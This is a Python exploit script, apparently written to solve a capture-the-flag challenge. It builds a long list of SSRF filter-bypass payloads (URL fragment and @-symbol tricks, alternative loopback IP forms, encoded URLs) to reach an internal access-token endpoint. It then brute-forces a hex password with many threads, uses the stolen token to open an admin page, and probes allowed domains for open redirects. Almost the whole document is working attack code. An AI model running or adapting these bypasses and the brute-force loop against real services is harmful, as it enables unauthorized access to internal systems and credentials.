#!/usr/bin/env python3
import requests
import threading
import time
import json
from urllib.parse import quote, quote_plus
import concurrent.futures

class SSRFExploit:
    def __init__(self, target_url):
        self.target_url = target_url.rstrip('/')
        self.session = requests.Session()
        self.session.timeout = 10
        self.found_password = None
        self.found_token = None
        
    def test_connection(self):
        """Test if target is reachable"""
        try:
            response = self.session.get(self.target_url)
            print(f"[+] Target is reachable: {response.status_code}")
            return True
        except Exception as e:
            print(f"[-] Target unreachable: {e}")
            return False
    
    def generate_bypass_payloads(self, internal_url):
        """Generate various SSRF bypass payloads"""
        payloads = []
        
        # Method 1: Fragment bypass
        for domain in ['abcd.com', 'asdf.com', 'example.com']:
            payloads.append(f"{internal_url}#{domain}")
            payloads.append(f"{internal_url}#.{domain}")
        
        # Method 2: @ symbol bypass
        for domain in ['abcd.com', 'asdf.com', 'example.com']:
            payloads.append(f"http://{domain}@127.0.0.1:5000/access-token")
            payloads.append(f"https://{domain}@127.0.0.1:5000/access-token")
        
        # Method 3: Query parameter bypass
        for domain in ['abcd.com', 'asdf.com', 'example.com']:
            payloads.append(f"{internal_url}&dummy={domain}")
            payloads.append(f"{internal_url}?fake={domain}")
        
        # Method 4: Alternative IP representations
        alt_ips = [
            "127.1",
            "127.0.1",
            "0177.0.0.1",
            "2130706433",
            "0x7f000001",
            "[::1]",
            "localhost",
        ]
        
        for ip in alt_ips:
            for domain in ['abcd.com', 'asdf.com', 'example.com']:
                if '[::1]' in ip:
                    payloads.append(f"http://{ip}:5000/access-token#{domain}")
                else:
                    payloads.append(f"http://{ip}:5000/access-token#{domain}")
        
        # Method 5: URL encoding variations
        for domain in ['abcd.com', 'asdf.com', 'example.com']:
            encoded_internal = quote("http://127.0.0.1:5000/access-token", safe='')
            payloads.append(f"{encoded_internal}#{domain}")
            
            double_encoded = quote(encoded_internal, safe='')
            payloads.append(f"{double_encoded}#{domain}")
        
        # Method 6: Subdomain method
        subdomain_ips = [
            "127.0.0.1.abcd.com",
            "127.0.0.1.asdf.com", 
            "127.0.0.1.example.com"
        ]
        for subdomain in subdomain_ips:
            payloads.append(f"http://{subdomain}:5000/access-token")
        
        return list(set(payloads))
    
    def try_password_with_payload(self, password_hex, payload):
        """Try a specific password with a specific bypass payload"""
        try:
            # Add password to payload
            if '?' in payload:
                full_payload = f"{payload}&password={password_hex}"
            else:
                full_payload = f"{payload}?password={password_hex}"
            
            # Fix the f-string backslash issue
            safe_chars = ':/?#[]@!$&()*+,;='
            encoded_payload = quote(full_payload, safe=safe_chars)
            url = f"{self.target_url}/user-page?url={encoded_payload}"
            
            response = self.session.get(url, timeout=5)
            
            if response.status_code == 200:
                try:
                    data = response.json()
                    if 'response' in data:
                        inner_response = data['response']
                        if 'server' in inner_response and 'Wrong' not in inner_response:
                            try:
                                inner_data = json.loads(inner_response)
                                if 'server' in inner_data and inner_data['server'] != "Nop~ Password Wrong><":
                                    print(f"[+] SUCCESS! Password: {password_hex}, Payload: {payload}")
                                    print(f"[+] Response: {inner_response}")
                                    self.found_password = password_hex
                                    self.found_token = inner_data.get('server')
                                    return True
                            except json.JSONDecodeError:
                                if "Wrong" not in inner_response and len(inner_response) > 10:
                                    print(f"[+] Possible SUCCESS! Password: {password_hex}")
                                    print(f"[+] Response: {inner_response}")
                                    return True
                except json.JSONDecodeError:
                    pass
                    
        except Exception as e:
            pass
            
        return False
    
    def brute_force_password(self):
        """Brute force the 2-digit hex password with various bypass techniques"""
        print("[*] Starting password brute force with SSRF bypass...")
        
        base_internal_url = "http://127.0.0.1:5000/access-token"
        payloads = self.generate_bypass_payloads(base_internal_url)
        
        print(f"[*] Generated {len(payloads)} bypass payloads")
        
        # Try each payload with each possible password
        with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
            futures = []
            
            for password in range(256):
                password_hex = f"{password:02X}"
                for payload in payloads:
                    future = executor.submit(self.try_password_with_payload, password_hex, payload)
                    futures.append((future, password_hex, payload))
            
            for future, password_hex, payload in futures:
                try:
                    if future.result(timeout=1):
                        print(f"[+] Found working combination!")
                        print(f"[+] Password: {password_hex}")
                        print(f"[+] Payload: {payload}")
                        
                        for f, _, _ in futures:
                            f.cancel()
                        
                        return True
                except concurrent.futures.TimeoutError:
                    continue
                except Exception:
                    continue
        
        print("[-] No working password/payload combination found")
        return False
    
    def get_flag(self):
        """Use the found token to get the flag"""
        if not self.found_token:
            print("[-] No token found, cannot get flag")
            return False
        
        try:
            url = f"{self.target_url}/admin?token={self.found_token}"
            response = self.session.get(url)
            
            if response.status_code == 200:
                print(f"[+] FLAG FOUND!")
                print(f"[+] Response: {response.text}")
                return True
            else:
                print(f"[-] Failed to get flag: {response.status_code}")
                print(f"[-] Response: {response.text}")
                
        except Exception as e:
            print(f"[-] Error getting flag: {e}")
        
        return False
    
    def check_open_redirects(self):
        """Check if allowed domains have open redirects"""
        print("[*] Checking for open redirects on allowed domains...")
        
        allowed_domains = ['abcd.com', 'asdf.com', 'example.com']
        redirect_params = ['url', 'redirect', 'next', 'goto', 'target', 'dest', 'destination', 'redir']
        
        for domain in allowed_domains:
            for param in redirect_params:
                try:
                    test_url = f"http://{domain}/?{param}=http://127.0.0.1:5000/access-token"
                    print(f"[*] Testing redirect: {test_url}")
                    
                    ssrf_url = f"{self.target_url}/user-page?url={quote(test_url)}"
                    response = self.session.get(ssrf_url, timeout=5)
                    
                    if response.status_code == 200:
                        print(f"[+] Potential redirect found: {test_url}")
                        
                except Exception:
                    continue
    
    def run_full_exploit(self):
        """Run the complete exploitation chain"""
        print("="*60)
        print("CTF SSRF Exploitation Script")
        print("="*60)
        
        if not self.test_connection():
            return False
        
        print("\n[*] Attempting SSRF bypass and password brute force...")
        
        if self.brute_force_password():
            print(f"\n[+] Successfully found credentials!")
            print(f"[+] Password: {self.found_password}")
            print(f"[+] Token: {self.found_token}")
            
            print("\n[*] Attempting to retrieve flag...")
            if self.get_flag():
                return True
        
        print("\n[*] Direct approach failed, checking for open redirects...")
        self.check_open_redirects()
        
        return False

def main():
    TARGET_URL = "http://cookie_games:1919"
    
    print("Starting CTF exploitation...")
    
    exploit = SSRFExploit(TARGET_URL)
    success = exploit.run_full_exploit()
    
    if success:
        print("\n[+] Exploitation successful!")
    else:
        print("\n[-] Exploitation failed. Manual investigation may be needed.")
        print("\n[*] Manual testing suggestions:")
        print("1. Check if any allowed domains actually exist and have redirects")
        print("2. Try manual curl commands to test different bypass methods")
        print("3. Check for other endpoints that might be vulnerable")
        print("4. Consider timing-based attacks or other side channels")

if __name__ == "__main__":
    main()
